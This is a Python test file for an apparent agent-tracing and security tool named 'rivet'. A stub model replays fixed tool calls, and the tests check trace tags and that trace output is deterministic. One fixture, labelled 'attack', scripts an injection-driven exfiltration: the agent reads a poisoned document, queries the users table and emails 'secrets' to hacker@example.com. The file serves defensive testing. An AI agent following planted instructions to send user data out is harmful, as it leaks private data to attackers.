"""Runner seam: run_scenario(scenario, StubLLM) -> Trace (no Ollama)."""

from __future__ import annotations

from pathlib import Path

from rivet.agent.llm import StubLLM, StubToolCall
from rivet.agent.runner import Scenario, run_scenario
from rivet.trace import dump_trace, load_trace


def test_stub_run_produces_valid_trace_with_join_provenance(tmp_path: Path) -> None:
    scenario = Scenario(name="exfil-demo", label="attack")
    llm = StubLLM(
        [
            StubToolCall(tool="read_file", inputs={"path": "poisoned_doc"}, from_steps=[]),
            StubToolCall(tool="query_db", inputs={"table": "users"}, from_steps=[]),
            StubToolCall(
                tool="send_email",
                inputs={
                    "to": "hacker@example.com",
                    "subject": "secrets",
                    "body": "exfil",
                },
                from_steps=[1, 2],
            ),
        ]
    )

    trace = run_scenario(scenario, llm, seed="1", traces_dir=tmp_path)

    assert trace.schema_version == "1"
    assert trace.run_id == "exfil-demo-1"
    assert trace.label == "attack"
    assert [s.tool for s in trace.steps] == ["read_file", "query_db", "send_email"]
    assert trace.steps[0].tags.source_trust == "untrusted"
    assert trace.steps[0].tags.sink_type == "none"
    assert trace.steps[1].tags.sink_type == "sensitive"
    assert trace.steps[2].tags.sink_type == "external"
    assert trace.steps[2].provenance.from_steps == [1, 2]
    assert trace.steps[0].provenance.from_steps == []

    out = tmp_path / "attack" / "exfil-demo-1.json"
    assert out.is_file()
    assert load_trace(out).run_id == "exfil-demo-1"


def test_dump_is_byte_identical_for_fixed_seed(tmp_path: Path) -> None:
    scenario = Scenario(name="benign-demo", label="benign")
    plan = [
        StubToolCall(tool="read_file", inputs={"path": "trusted_doc"}, from_steps=[]),
    ]

    t1 = run_scenario(scenario, StubLLM(plan), seed="fixed", traces_dir=tmp_path / "a")
    t2 = run_scenario(scenario, StubLLM(plan), seed="fixed", traces_dir=tmp_path / "b")

    assert dump_trace(t1) == dump_trace(t2)
